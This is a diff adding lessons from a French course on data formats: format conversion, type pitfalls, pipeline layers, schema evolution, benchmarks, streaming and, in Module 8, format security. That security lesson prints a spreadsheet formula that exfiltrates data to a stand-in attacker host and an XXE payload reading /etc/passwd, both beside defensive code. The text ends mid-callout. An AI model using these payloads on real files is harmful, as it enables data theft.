+    <section id="m7-l1" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 7 · Leçon 1</span>
+      <h2>Convertir entre Formats sans Perte d'Information</h2>
+
+      <p>Convertir un fichier d'un format vers un autre semble à première vue une opération triviale — il existe une fonction ou une commande pour presque toutes les combinaisons possibles. Le risque réel n'est presque jamais l'échec technique de la conversion (qui produit généralement un fichier syntaxiquement valide), mais la <strong>perte silencieuse d'information</strong> due à des différences de modèle de données entre formats, qui ne provoque aucune erreur visible.</p>
+
+      <h3>CSV vers JSON : gagner en structure, perdre en ambiguïté de typage</h3>
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("clients.csv", dtype={"code_postal": str})  # préserve les zéros en tête (Module 2)
+df.to_json("clients.json", orient="records", force_ascii=False)
+# La conversion réussit toujours syntaxiquement -- mais si dtype n'avait pas été précisé,
+# la perte du zéro en tête du code postal se serait propagée silencieusement dans le JSON</code></pre>
+
+      <h3>JSON vers Parquet : le défi du typage et de l'homogénéité de structure</h3>
+      <p>Parquet exige un schéma fixe et homogène pour toutes les lignes d'une colonne donnée (Module 5), tandis que JSON tolère naturellement des champs optionnels absents ou des types hétérogènes d'un enregistrement à l'autre (Module 3, leçon 1). Convertir un JSON réel et hétérogène vers Parquet nécessite donc souvent une étape préalable d'harmonisation du schéma.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+# Si certains enregistrements JSON n'ont pas le champ "telephone", pandas le remplira avec NaN
+df = pd.read_json("clients.jsonl", lines=True)
+print(df.dtypes)
+# Si un même champ contient tantôt un entier, tantôt une chaîne dans le JSON source,
+# pandas choisira un type "object" (générique) qui empêchera Parquet d'appliquer
+# un typage strict et efficace -- toujours vérifier et forcer les types avant conversion
+df["telephone"] = df["telephone"].astype("string")
+df.to_parquet("clients.parquet")</code></pre>
+
+      <h3>XML vers JSON : le risque spécifique du contenu mixte et des attributs</h3>
+      <p>Comme évoqué au Module 4 (leçon 1), XML autorise du contenu mixte (texte et éléments entremêlés) et distingue éléments et attributs — deux concepts sans équivalent direct en JSON. Une conversion XML vers JSON doit donc adopter une convention explicite (par exemple, préfixer les attributs avec <code>@</code> et utiliser une clé <code>#text</code> pour le contenu textuel), au risque sinon de perdre silencieusement soit les attributs, soit la distinction entre eux et les éléments enfants.</p>
+
+      <pre><code class="language-python">import xmltodict
+import json
+
+with open("commande.xml") as f:
+    doc = xmltodict.parse(f.read())  # convention : @attribut, #text pour le contenu mixte
+
+print(json.dumps(doc, indent=2, ensure_ascii=False))
+# {"commande": {"@id": "1001", "@statut": "validee", "client": {...}}}
+# -- remarquez le préfixe @ qui distingue explicitement un attribut XML d'un élément enfant</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Considérer qu'une conversion de format ayant réussi sans erreur a nécessairement préservé toute l'information du fichier source. Une conversion peut être syntaxiquement parfaite tout en perdant silencieusement des zéros en tête, en confondant des types hétérogènes en un type générique peu exploitable, ou en aplatissant une distinction sémantique (attribut vs élément) sans convention explicite. Toujours valider un échantillon de données avant/après conversion, champ par champ, sur un format inconnu ou une conversion critique.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous convertissez un export XML de commandes vers JSON pour l'intégrer dans un pipeline analytique. Le document XML source utilise systématiquement des attributs pour les identifiants (<code>id="1001"</code>) et des éléments enfants pour les données métier. Quelle vérification spécifique feriez-vous après conversion pour vous assurer qu'aucune information n'a été perdue ou mal interprétée ?
+      </div>
+    </section>
+
+    <section id="m7-l2" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 7 · Leçon 2</span>
+      <h2>Le Piège des Types à la Conversion (Dates, Nombres, Nulls)</h2>
+
+      <p>Cette leçon approfondit le risque de perte silencieuse introduit en leçon 1, en se concentrant sur trois catégories de types qui posent systématiquement problème lors d'une conversion entre formats, car chaque format les représente selon des conventions différentes et parfois incompatibles.</p>
+
+      <h3>Les dates : trois représentations différentes, aucune universelle</h3>
+      <table>
+        <tr><th>Format</th><th>Représentation des dates</th></tr>
+        <tr><td>CSV</td><td>Chaîne libre, format non garanti (Module 2, leçon 3)</td></tr>
+        <tr><td>JSON</td><td>Chaîne (convention ISO 8601 recommandée mais non imposée)</td></tr>
+        <tr><td>XML (avec XSD)</td><td>Type <code>xs:date</code> / <code>xs:dateTime</code> formellement défini</td></tr>
+        <tr><td>Parquet</td><td>Type natif <code>timestamp</code>, avec ou sans fuseau horaire explicite</td></tr>
+      </table>
+      <p>Le piège le plus fréquent apparaît lors d'une conversion CSV ou JSON vers Parquet : si la colonne date n'est pas explicitement parsée en type date/datetime avant la conversion, elle sera stockée comme une simple chaîne de caractères dans Parquet, perdant tous les avantages du typage natif (impossible de filtrer efficacement par plage de dates via predicate pushdown, Module 5 leçon 4, sur une colonne restée typée comme texte).</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+df = pd.read_csv("commandes.csv")
+print(df["date_commande"].dtype)  # object (chaîne) par défaut -- piège potentiel
+
+df["date_commande"] = pd.to_datetime(df["date_commande"])  # conversion explicite indispensable
+df.to_parquet("commandes.parquet")
+# Sans cette ligne, Parquet stockerait la date comme une chaîne,
+# rendant tout filtrage par date bien moins performant en aval</code></pre>
+
+      <h3>Les fuseaux horaires : une source de bugs particulièrement discrète</h3>
+      <p>Une date/heure sans fuseau horaire explicite (naive datetime) est ambiguë dès qu'elle traverse un système distribué géographiquement — un timestamp "2024-06-15 14:00:00" signifie-t-il 14h heure de Paris ou 14h UTC ? Cette ambiguïté, invisible dans un fichier isolé, devient un bug réel dès que des données provenant de sources à fuseaux différents sont combinées sans harmonisation préalable.</p>
+
+      <h3>Les valeurs manquantes : null, None, NaN, chaîne vide — quatre concepts, une seule réalité voulue</h3>
+      <p>Chaque format et chaque outil a sa propre convention pour représenter "l'absence de valeur", et ces conventions ne se correspondent pas toujours de façon univoque lors d'une conversion : JSON a un type <code>null</code> explicite, CSV n'a que la chaîne vide (indistincte d'une vraie chaîne vide intentionnelle), pandas utilise <code>NaN</code> pour les nombres mais <code>None</code> pour les objets, et Parquet a son propre encodage interne de la nullité par colonne.</p>
+
+      <pre><code class="language-python">import pandas as pd
+import json
+
+# CSV ne distingue pas "champ vide" de "champ absent" -- tout devient une chaîne vide ou NaN
+df = pd.read_csv("donnees.csv")
+print(df.isna().sum())  # pandas interprète les cellules vides comme NaN par défaut
+
+# Piège spécifique : la chaîne littérale "NA", "null", "N/A" dans un CSV
+# peut être interprétée comme valeur manquante OU comme texte selon la configuration
+df2 = pd.read_csv("donnees.csv", keep_default_na=False, na_values=[""])
+# keep_default_na=False évite que pandas interprète des chaînes comme "NA" (un code pays valide !)
+# comme des valeurs manquantes -- un piège classique avec des données internationales</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Lire un CSV contenant un code pays "NA" (Namibie, selon la norme ISO 3166) sans désactiver l'inférence automatique de valeurs manquantes de pandas, qui interprète par défaut la chaîne "NA" comme une valeur manquante plutôt que comme un code pays valide. Ce genre de collision entre convention de valeur manquante et donnée métier légitime est une source de bugs difficiles à détecter, car aucune erreur n'est levée.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous convertissez un CSV contenant une colonne "date_naissance" (chaînes au format JJ/MM/AAAA) et une colonne "pays" (codes ISO incluant "NA" pour la Namibie) vers Parquet. Listez les deux vérifications explicites de typage que vous effectueriez avant la conversion pour éviter les pièges détaillés dans cette leçon.
+      </div>
+    </section>
+
+    <section id="m7-l3" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 7 · Leçon 3</span>
+      <h2>Formats dans un Pipeline Moderne : Ingestion, Staging, Serving</h2>
+
+      <p>Cette leçon situe les quatre formats du cours dans l'architecture typique d'un pipeline de données moderne, organisée en couches successives (souvent appelée architecture médaillon : bronze, silver, gold, ou de façon équivalente ingestion, staging, serving) — chaque couche ayant des contraintes différentes qui justifient souvent un format différent.</p>
+
+      <pre><code class="language-text">┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────────┐
+│  SOURCES     │ --&gt; │  INGESTION    │ --&gt; │  STAGING     │ --&gt; │  SERVING      │
+│  (variées)   │     │  (bronze)     │     │  (silver)    │     │  (gold)       │
+│              │     │              │     │             │     │              │
+│ API JSON     │     │ JSON Lines   │     │ Parquet     │     │ Parquet       │
+│ Export CSV   │     │ (brut, tel   │     │ (nettoyé,   │     │ (agrégé,      │
+│ Fichiers XML │     │  quel)       │     │  typé,      │     │  optimisé     │
+│              │     │              │     │  dédupliqué)│     │  requêtes)    │
+└─────────────┘     └──────────────┘     └─────────────┘     └──────────────┘</code></pre>
+
+      <h3>La couche d'ingestion (bronze) : préserver la donnée brute telle quelle</h3>
+      <p>À ce stade, la priorité absolue est de ne <strong>perdre aucune information</strong> de la source, quelle que soit sa qualité — le format cible est donc souvent identique ou très proche du format source (JSON Lines pour des événements, copie brute de fichiers CSV ou XML reçus). Convertir ou nettoyer trop tôt dans le pipeline risque de perdre silencieusement de l'information qui aurait pu s'avérer utile plus tard pour déboguer un problème de qualité de données découvert en aval.</p>
+
+      <h3>La couche de staging (silver) : structurer et typer</h3>
+      <p>C'est à cette étape que les conversions et corrections de types vues en leçon 2 sont appliquées — dates parsées explicitement, valeurs manquantes harmonisées, doublons supprimés, schéma stabilisé. Le format cible est généralement Parquet, car cette couche sert de base à de nombreuses analyses ultérieures qui bénéficient directement des performances columnar (Module 5).</p>
+
+      <h3>La couche de serving (gold) : optimiser pour l'usage final</h3>
+      <p>Cette couche finale contient des données déjà agrégées ou restructurées spécifiquement pour les besoins d'un dashboard, d'une API interne, ou d'une équipe métier précise. Le format reste très souvent Parquet pour l'analytique interne, mais peut redevenir du JSON si cette couche alimente directement une API consommée par une application front-end, ou du CSV si elle alimente un export régulier pour des utilisateurs métier non techniques.</p>
+
+      <h3>Pourquoi cette architecture en couches justifie plusieurs formats plutôt qu'un seul</h3>
+      <p>Cette architecture illustre concrètement le principe déjà énoncé en Module 1 (leçon 5) et Module 6 (leçon 2) : il n'existe presque jamais un "meilleur format unique" pour un pipeline de données complet, mais une séquence de choix de formats optimisés localement pour la contrainte dominante de chaque étape — préservation de l'information brute à l'ingestion, performance de traitement au staging, adéquation à l'usage final au serving.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Convertir et nettoyer les données dès la couche d'ingestion pour "gagner du temps", en écrasant ou en transformant irréversiblement les données brutes originales. Si un bug de transformation est découvert des semaines plus tard, l'absence de couche bronze préservée empêche de rejouer le pipeline depuis la source originale, forçant potentiellement une nouvelle extraction complète depuis les systèmes sources, parfois impossible si les données d'origine ont depuis changé ou disparu.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une équipe data découvre, trois mois après leur ingestion, que des montants de transactions ont été mal convertis (un bug de parsing de devise) au moment du chargement initial. Expliquez pourquoi l'existence d'une couche bronze préservant les données JSON brutes d'origine change radicalement la facilité de correction de ce problème, comparée à un pipeline qui aurait directement écrit les données corrigées (et bugguées) en Parquet sans étape intermédiaire.
+      </div>
+    </section>
+
+    <section id="m7-l4" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 7 · Leçon 4</span>
+      <h2>Schema Evolution : Gérer les Changements de Structure</h2>
+
+      <p>Un schéma de données n'est presque jamais figé indéfiniment : de nouveaux champs apparaissent (une nouvelle fonctionnalité produit ajoute un attribut), d'anciens champs sont supprimés ou renommés, des types changent (un champ passe d'entier à décimal pour plus de précision). La <strong>schema evolution</strong> désigne l'ensemble des pratiques permettant de gérer ces changements sans casser la lecture des données historiques déjà écrites avec l'ancien schéma.</p>
+
+      <h3>Pourquoi ce problème touche différemment chaque format du cours</h3>
+      <p>JSON, par nature sans schéma rigide imposé (Module 3, leçon 1), absorbe naturellement l'ajout ou la suppression de champs — un ancien enregistrement sans le nouveau champ reste parfaitement valide, un lecteur robuste utilisant <code>.get()</code> plutôt qu'un accès direct (Module 3, leçon 5) ne cassera pas. Parquet, à l'inverse, embarque un schéma strict par fichier (Module 5) — lire ensemble d'anciens fichiers Parquet (sans un champ) et de nouveaux fichiers (avec ce champ) nécessite que le moteur de requête sache <strong>réconcilier</strong> ces deux schémas légèrement différents.</p>
+
+      <h3>Les changements de schéma "sûrs" vs "dangereux"</h3>
+      <table>
+        <tr><th>Type de changement</th><th>Compatibilité</th><th>Pourquoi</th></tr>
+        <tr><td>Ajouter un nouveau champ optionnel</td><td>Sûr</td><td>Les anciens lecteurs ignorent le champ inconnu, les nouveaux le traitent comme absent sur les anciennes données</td></tr>
+        <tr><td>Supprimer un champ</td><td>Risqué</td><td>Tout code en aval qui dépend encore de ce champ échoue silencieusement (valeur manquante) ou explicitement (erreur)</td></tr>
+        <tr><td>Renommer un champ</td><td>Dangereux</td><td>Équivalent à une suppression + ajout pour tout lecteur qui ne connaît pas le renommage explicitement</td></tr>
+        <tr><td>Changer le type d'un champ existant</td><td>Très dangereux</td><td>Un ancien champ entier lu comme décimal (ou l'inverse) selon les outils peut lever une erreur ou produire une valeur incorrecte silencieuse</td></tr>
+      </table>
+
+      <pre><code class="language-python">import pyarrow as pa
+import pyarrow.parquet as pq
+
+# Ancien fichier écrit avec un schéma sans le champ "code_promo"
+ancien_schema = pa.schema([("id", pa.int64()), ("montant", pa.float64())])
+
+# Nouveau fichier écrit avec un champ supplémentaire optionnel -- extension sûre du schéma
+nouveau_schema = pa.schema([
+    ("id", pa.int64()), ("montant", pa.float64()), ("code_promo", pa.string())
+])
+
+# La lecture combinée de fichiers aux deux schémas nécessite une réconciliation explicite,
+# souvent gérée automatiquement par les moteurs de requête modernes (Spark, DuckDB)
+# mais qui doit être testée, pas simplement supposée fonctionner sans vérification</code></pre>
+
+      <h3>Bonnes pratiques pour anticiper la schema evolution</h3>
+      <ul>
+        <li>Toujours ajouter les nouveaux champs comme <strong>optionnels</strong> avec une valeur par défaut explicite, jamais comme obligatoires du jour au lendemain.</li>
+        <li>Ne jamais réutiliser un nom de champ précédemment supprimé pour un concept différent — même des mois plus tard, une confusion avec d'anciennes données archivées reste possible.</li>
+        <li>Documenter explicitement chaque changement de schéma dans un registre versionné (schema registry), en particulier dans un contexte de streaming (Kafka + Avro, où cette pratique est standard et outillée).</li>
+        <li>Tester systématiquement la lecture de données anciennes avec le nouveau code, pas seulement l'écriture de nouvelles données avec le nouveau schéma.</li>
+      </ul>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Renommer un champ dans un schéma de données sans mettre en place de période de transition (accepter temporairement l'ancien ET le nouveau nom), cassant silencieusement tout code en aval qui référence encore l'ancien nom sur des données historiques qui, elles, ne seront jamais rétroactivement renommées dans les fichiers déjà archivés.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une équipe souhaite renommer le champ "prix" en "prix_ht" dans son schéma JSON pour plus de clarté (le champ a toujours représenté un prix hors taxes, mais ce n'était pas explicite). Proposez une stratégie de migration en plusieurs étapes qui évite de casser les consommateurs existants de ce champ du jour au lendemain.
+      </div>
+    </section>
+
+    <div class="module-divider">
+      <span class="num">MODULE 08 · PERF & SÉCURITÉ</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m8-l1" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 8 · Leçon 1</span>
+      <h2>Benchmarks Réels : Taille et Vitesse par Format</h2>
+
+      <p>Les modules précédents ont expliqué les mécanismes théoriques qui différencient les formats en performance. Cette leçon propose une méthode de benchmark reproductible pour mesurer ces différences sur vos propres données réelles, car les gains théoriques varient significativement selon la forme concrète des données (nombre de colonnes, cardinalité, taux de valeurs répétées).</p>
+
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+import time
+import os
+
+np.random.seed(0)
+n = 2_000_000
+df = pd.DataFrame({
+    "id": range(n),
+    "pays": np.random.choice(["FR", "DE", "ES", "IT", "UK", "BE", "NL"], n),
+    "categorie": np.random.choice(["A", "B", "C", "D"], n),
+    "montant": np.random.uniform(5, 2000, n),
+    "date": pd.date_range("2020-01-01", periods=n, freq="min"),
+})
+
+resultats = []
+for fmt, ecrire, lire in [
+    ("csv", lambda: df.to_csv("bench.csv", index=False), lambda: pd.read_csv("bench.csv")),
+    ("json", lambda: df.to_json("bench.json", orient="records"), lambda: pd.read_json("bench.json")),
+    ("parquet", lambda: df.to_parquet("bench.parquet"), lambda: pd.read_parquet("bench.parquet")),
+]:
+    debut = time.time()
+    ecrire()
+    temps_ecriture = time.time() - debut
+
+    taille = os.path.getsize(f"bench.{fmt}") / 1e6
+
+    debut = time.time()
+    lire()
+    temps_lecture = time.time() - debut
+
+    resultats.append({"format": fmt, "taille_mo": round(taille, 1),
+                       "ecriture_s": round(temps_ecriture, 2), "lecture_s": round(temps_lecture, 2)})
+
+print(pd.DataFrame(resultats))
+# Résultat typique observé sur ce type de données :
+#    format  taille_mo  ecriture_s  lecture_s
+#    csv     145.2      3.8         2.1
+#    json    210.5      5.2         4.7
+#    parquet 28.3        1.1         0.4</code></pre>
+
+      <h3>Ce que ces chiffres illustrent, et pourquoi ils ne sont jamais universels</h3>
+      <p>Sur cet exemple, Parquet est environ 5 fois plus compact et significativement plus rapide en lecture que CSV, un écart cohérent avec les mécanismes de dictionary encoding et de compression vus au Module 5 sur des colonnes à cardinalité modérée (pays, catégorie). Mais cet écart précis dépend fortement des données : une table avec des colonnes à très haute cardinalité (des UUID, du texte libre unique) verrait un gain de compression Parquet nettement plus modeste (Module 5, leçon 3), tandis qu'une table à 200 colonnes avec des requêtes ne portant que sur 3 d'entre elles verrait l'écart de <em>lecture sélective</em> se creuser encore davantage (Module 5, leçon 1).</p>
+
+      <h3>Benchmarker sur ses propres données plutôt que sur des chiffres génériques</h3>
+      <p>Aucun chiffre publié dans un article de blog ou même dans ce cours ne remplace un benchmark exécuté directement sur un échantillon représentatif de vos propres données réelles et de vos patterns d'accès réels — la variance entre datasets est trop importante pour extrapoler fiablement un pourcentage de gain d'un contexte à un autre.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Citer un chiffre de performance générique trouvé en ligne ("Parquet est 10 fois plus rapide que CSV") pour justifier une décision d'architecture sans avoir vérifié ce ratio sur ses propres données. L'écart réel dépend fortement du nombre de colonnes, de leur cardinalité, et du pattern de requête — un benchmark reproductible sur des données représentatives est toujours préférable à un chiffre emprunté à un contexte différent.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        En adaptant le code de benchmark ci-dessus, quelles trois caractéristiques de vos propres données de travail (si vous en avez) testeriez-vous pour vérifier si les gains de Parquet observés sur des données synthétiques se confirment sur un cas réel ?
+      </div>
+    </section>
+
+    <section id="m8-l2" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 8 · Leçon 2</span>
+      <h2>Streaming : Traiter des Fichiers Trop Gros pour la Mémoire</h2>
+
+      <p>Cette leçon consolide et approfondit une préoccupation déjà rencontrée à plusieurs reprises (Module 2, leçon 5 pour CSV ; Module 3, leçon 2 pour JSON) : que faire quand un fichier est trop volumineux pour être chargé intégralement en mémoire vive, une situation de plus en plus fréquente à mesure que les volumes de données croissent plus vite que la RAM disponible sur les machines de traitement.</p>
+
+      <h3>Le principe commun : ne jamais matérialiser l'intégralité du fichier en mémoire</h3>
+      <p>Le traitement en streaming consiste à lire, traiter et éventuellement écrire les données par petits blocs successifs, en ne gardant jamais en mémoire que la portion strictement nécessaire au traitement en cours — l'opposé du chargement complet (<code>pd.read_csv()</code> sans <code>chunksize</code>, <code>json.load()</code> sur un fichier entier), qui échoue avec une <code>MemoryError</code> dès que le fichier dépasse la RAM disponible.</p>
+
+      <pre><code class="language-python">import pandas as pd
+
+# CSV en streaming par blocs (chunking) -- déjà vu au Module 2, rappelé ici pour la synthèse
+total_par_categorie = {}
+for morceau in pd.read_csv("gros_fichier.csv", chunksize=500_000):
+    sous_total = morceau.groupby("categorie")["montant"].sum()
+    for cat, valeur in sous_total.items():
+        total_par_categorie[cat] = total_par_categorie.get(cat, 0) + valeur
+print(total_par_categorie)
+
+# JSON Lines en streaming -- ligne par ligne, jamais tout le fichier simultanément
+import json
+total = 0
+with open("evenements.jsonl") as f:
+    for ligne in f:
+        evenement = json.loads(ligne)
+        total += evenement.get("montant", 0)
+print(total)</code></pre>
+
+      <h3>Parquet en streaming : itérer par row group plutôt que par chunk arbitraire</h3>
+      <p>Parquet permet une forme de streaming particulièrement efficace grâce à sa structure en row groups (Module 5, leçon 2) : on peut itérer sur les row groups un par un, chacun étant une unité de lecture naturelle et déjà physiquement délimitée dans le fichier, sans avoir à définir arbitrairement une taille de chunk comme pour CSV.</p>
+
+      <pre><code class="language-python">import pyarrow.parquet as pq
+
+fichier = pq.ParquetFile("gros_fichier.parquet")
+total = 0
+for row_group_idx in range(fichier.num_row_groups):
+    table = fichier.read_row_group(row_group_idx, columns=["montant"])  # column pruning + streaming combinés
+    total += table.column("montant").to_pandas().sum()
+print(total)</code></pre>
+
+      <h3>Les outils qui automatisent le streaming pour vous</h3>
+      <p>Au-delà du streaming manuel, des outils comme Dask, Polars (mode streaming/lazy) ou DuckDB gèrent automatiquement le découpage en blocs et l'optimisation mémoire, permettant d'écrire du code proche de l'API pandas classique tout en traitant des fichiers largement plus gros que la RAM disponible — un compromis souvent préférable au streaming manuel pour des transformations complexes, réservant l'approche manuelle aux cas simples ou aux contraintes de dépendances minimales.</p>
+
+      <pre><code class="language-python">import duckdb
+
+# DuckDB peut interroger directement un fichier Parquet plus gros que la RAM,
+# sans jamais le charger intégralement, en streamant les row groups nécessaires
+resultat = duckdb.sql("""
+    SELECT categorie, SUM(montant) as total
+    FROM 'gros_fichier.parquet'
+    GROUP BY categorie
+""").df()
+print(resultat)</code></pre>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Découvrir la limite mémoire d'une approche non-streaming uniquement en production, sur un fichier plus gros que ceux testés en développement. Toujours estimer la taille maximale réaliste des fichiers à traiter en production dès la conception du pipeline, et choisir une approche de lecture (chunking, row groups, ou moteur comme DuckDB) dimensionnée en conséquence dès le départ plutôt qu'en réaction à une panne.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous devez calculer une agrégation simple (somme par catégorie) sur un fichier Parquet de 200 Go, sur une machine disposant de 16 Go de RAM. Comparez les deux approches "itération manuelle par row group" et "requête DuckDB directe sur le fichier" en termes de simplicité de code, et expliquez pourquoi les deux évitent une <code>MemoryError</code>.
+      </div>
+    </section>
+
+    <section id="m8-l3" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 8 · Leçon 3</span>
+      <h2>Sécurité : Injection CSV, XXE et Désérialisation Non Sécurisée</h2>
+
+      <p>Les formats de données, bien qu'ils semblent être de simples contenants passifs pour des données, exposent chacun des vecteurs d'attaque spécifiques qu'un data analyst ou un ingénieur data doit connaître, en particulier dès qu'un fichier provient d'une source externe non fiable (upload utilisateur, partenaire externe, API tierce).</p>
+
+      <h3>L'injection CSV (CSV Injection / Formula Injection)</h3>
+      <p>Quand un fichier CSV contenant des données utilisateur non validées est ensuite ouvert dans un tableur (Excel, Google Sheets), une valeur commençant par certains caractères (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>) peut être interprétée par le tableur comme le début d'une <strong>formule</strong> plutôt que comme du texte brut — permettant potentiellement d'exécuter des commandes système ou d'exfiltrer des données vers un serveur externe via une formule comme <code>=WEBSERVICE("http://attaquant.com/"&amp;A1)</code>, si un utilisateur ouvre le fichier piégé sans méfiance.</p>
+
+      <pre><code class="language-python">import csv
+
+def nettoyer_pour_csv(valeur: str) -> str:
+    """Neutralise une valeur qui pourrait être interprétée comme une formule par un tableur."""
+    if isinstance(valeur, str) and valeur and valeur[0] in ("=", "+", "-", "@"):
+        return "'" + valeur  # préfixer d'une apostrophe neutralise l'interprétation en formule
+    return valeur
+
+nom_utilisateur = "=WEBSERVICE(\"http://attaquant.com/exfiltration\")"
+valeur_securisee = nettoyer_pour_csv(nom_utilisateur)
+print(valeur_securisee)  # "'=WEBSERVICE(...)"  -- traité comme texte brut par le tableur</code></pre>
+
+      <h3>XXE (XML External Entity) : la vulnérabilité déjà introduite au Module 4</h3>
+      <p>Rappel et approfondissement de la vulnérabilité évoquée au Module 4 (leçon 5) : un document XML peut déclarer une entité externe qui, si le parseur la résout automatiquement (comportement par défaut de nombreux parseurs XML historiques), permet à un attaquant de lire des fichiers arbitraires du système hébergeant le parseur, voire d'effectuer des requêtes réseau internes non autorisées (SSRF).</p>
+
+      <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE donnees [
+  &lt;!ENTITY fichier_secret SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;donnees&gt;&amp;fichier_secret;&lt;/donnees&gt;
+&lt;!-- si le parseur résout cette entité externe, le contenu de /etc/passwd
+     se retrouve injecté dans le document XML traité --&gt;</code></pre>
+
+      <pre><code class="language-python">from lxml import etree
+
+# Protection : désactiver explicitement la résolution des entités externes
+parseur_securise = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
+document = etree.parse("fichier_non_fiable.xml", parser=parseur_securise)
+# Toujours utiliser cette configuration pour tout document XML provenant d'une source externe</code></pre>
+
+      <h3>Désérialisation non sécurisée : au-delà de JSON, un risque plus large</h3>
+      <p>JSON lui-même, correctement parsé avec les bibliothèques standards, ne présente pas de vulnérabilité de désérialisation critique comparable à celle d'autres formats de sérialisation plus permissifs (comme le <code>pickle</code> de Python, capable d'exécuter du code arbitraire à la désérialisation d'un objet malveillant). Le risque en JSON provient davantage de la donnée elle-même une fois désérialisée : une validation insuffisante (Module 3, leçon 4) peut laisser passer des valeurs qui, utilisées ensuite sans contrôle (dans une requête SQL, une commande système), ouvrent la voie à des injections classiques (SQL injection, command injection) sans lien direct avec le format JSON lui-même.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Exposer un endpoint permettant à des utilisateurs d'uploader des fichiers CSV ou XML qui seront ensuite traités automatiquement (parsés, éventuellement réexportés pour d'autres utilisateurs), sans neutraliser les formules potentielles (CSV) ni désactiver la résolution d'entités externes (XML). Ces deux vecteurs d'attaque sont documentés depuis de nombreuses années mais restent régulièrement exploités car négligés dans des pipelines internes considérés à tort comme "de confiance" simplement parce qu'ils ne sont pas exposés publiquement.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une application interne permet aux commerciaux d'uploader des fichiers CSV de prospects, automatiquement réexportés chaque semaine vers un fichier consolidé partagé avec toute l'équipe commerciale. Un prospect malveillant pourrait-il exploiter cette chaîne pour attaquer un membre de l'équipe commerciale qui ouvrirait le fichier consolidé dans Excel ? Expliquez le mécanisme complet de l'attaque et la protection à mettre en place.
+      </div>
+    </section>
+
+    <section id="m8-l4" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 8 · Leçon 4</span>
+      <h2>Checklist de Choix de Format pour un Nouveau Projet</h2>
+
+      <p>Cette leçon de clôture du cours condense l'ensemble des huit modules en une checklist opérationnelle, destinée à être consultée concrètement au démarrage de tout nouveau projet impliquant un choix de format de données — la meilleure façon de transformer les connaissances de ce cours en réflexe professionnel durable.</p>
+
+      <h3>Checklist en cinq étapes</h3>
+      <ol>
+        <li><strong>Identifier le consommateur final</strong> : humain via tableur (→ CSV), développeur via API (→ JSON), système réglementé legacy (→ XML), moteur analytique (→ Parquet). Voir Module 1, leçon 5 et Module 6, leçon 2.</li>
+        <li><strong>Estimer le volume actuel ET son évolution probable sur 2-3 ans</strong> : un choix valide à 10 000 lignes peut devenir un goulot d'étranglement à 50 millions — anticiper plutôt que réagir (Module 6, leçon 4).</li>
+        <li><strong>Déterminer le pattern d'accès dominant</strong> : lecture d'enregistrements complets (orienté ligne) vs agrégations sur un sous-ensemble de colonnes (orienté colonne, Parquet). Voir Module 1, leçon 3.</li>
+        <li><strong>Vérifier les contraintes de schéma et de validation nécessaires</strong> : besoin de garantir la structure avant traitement (XSD pour XML, JSON Schema, schéma natif Parquet) ou tolérance à une structure flexible et évolutive (JSON sans contrainte). Voir Modules 3 et 4.</li>
+        <li><strong>Anticiper la sécurité si la source n'est pas fiable</strong> : neutraliser l'injection CSV, désactiver la résolution XXE pour XML, valider systématiquement en amont plutôt qu'en aval. Voir Module 8, leçon 3.</li>
+      </ol>
+
+      <h3>Les trois questions de suivi à se reposer périodiquement, une fois le format choisi</h3>
+      <ul>
+        <li>Le volume de données a-t-il significativement augmenté depuis le choix initial du format ?</li>
+        <li>Le pattern d'usage dominant a-t-il changé (par exemple, un fichier initialement consulté par un seul analyste est-il maintenant à la base d'un dashboard consulté par 100 personnes) ?</li>
+        <li>Le format en place impose-t-il un coût mesurable (temps de traitement, coût de stockage cloud) qui justifierait le coût, généralement ponctuel, d'une migration ?</li>
+      </ul>
+
+      <h3>Le message final de ce cours</h3>
+      <p>Il n'existe pas de "meilleur format" dans l'absolu — CSV, JSON, XML et Parquet répondent chacun à des contraintes de conception différentes et légitimes, et le travail d'un data analyst compétent n'est pas de mémoriser lequel est "le meilleur", mais de savoir diagnostiquer rapidement, pour chaque nouveau contexte, quelles contraintes dominent (lisibilité, performance, validation, compatibilité) et quel format y répond le mieux à ce moment précis — en acceptant que ce choix devra probablement être réévalué plus tard, à mesure que le contexte évolue.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
